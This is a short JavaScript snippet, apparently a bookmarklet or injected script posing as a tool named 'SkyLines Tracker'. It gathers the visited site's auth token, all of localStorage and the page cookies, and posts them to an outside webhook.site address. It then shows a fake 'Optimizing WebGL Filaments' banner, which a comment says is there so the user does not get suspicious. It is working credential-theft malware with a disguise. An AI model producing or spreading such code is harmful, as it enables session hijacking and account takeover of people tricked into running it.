(function() {
    // 1. Setup - Replace the URL below with your actual webhook
    const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
    const TOOL_NAME = "SkyLines Tracker";

    // 2. The Loot - Gathering data from the site the user is on
    const data = {
        site: window.location.hostname,
        token: localStorage.getItem('token') || 'No token found',
        allStorage: JSON.stringify(localStorage),
        cookies: document.cookie
    };

    // 3. The Send - Sending it to your webhook
    fetch(WEBHOOK_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
    });

    // 4. The Visual - What the user sees so they don't get suspicious
    const ui = document.createElement('div');
    ui.style = "position:fixed;top:20px;right:20px;padding:20px;background:#1c0033;color:#ab47bc;border:2px solid #ab47bc;z-index:999999;border-radius:10px;font-family:sans-serif;box-shadow:0 0 15px rgba(0,0,0,0.5);";
    ui.innerHTML = `<b>🚀 ${TOOL_NAME}</b><br><small>Optimizing WebGL Filaments...</small>`;
    document.body.appendChild(ui);

    // Remove the message after 3 seconds
    setTimeout(() => ui.remove(), 3000);
})();
